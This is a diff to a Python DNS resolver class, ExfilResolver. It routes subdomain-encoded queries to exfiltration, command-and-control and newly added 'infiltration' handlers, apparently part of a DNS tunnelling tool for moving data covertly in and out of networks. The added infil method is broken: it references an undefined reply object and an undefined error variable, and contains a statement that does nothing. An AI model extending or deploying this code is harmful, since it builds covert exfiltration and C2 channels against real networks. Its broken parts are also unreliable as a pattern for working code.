@@ -26,7 +26,7 @@ class ExfilResolver(BaseResolver):
         if module == "test": 
             print("Running test")
             message = "This is a test \"" 
-            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
+            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
             return reply
             
         if module == "ex":
@@ -34,10 +34,18 @@ class ExfilResolver(BaseResolver):
 
         if module == "c2":
             return self.cnc(request, qname)
+
+
+        if module == "in":
+            return self.infil(request, qname)
         
         print("Module not found:", module)
         reply.header.rcode = RCODE.NXDOMAIN
         return reply
+
+    def infil(self, request, qname):
+        reply.head.rcode
+        reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
 
     # unimplemented
     def cnc(self, request, qname):
@@ -56,7 +64,7 @@ class ExfilResolver(BaseResolver):
         if len(qname.split(".")) != 4:
             error = "Error: Incorrect amount of subdomains"
             print(error)
-            # reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
+            # reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
             
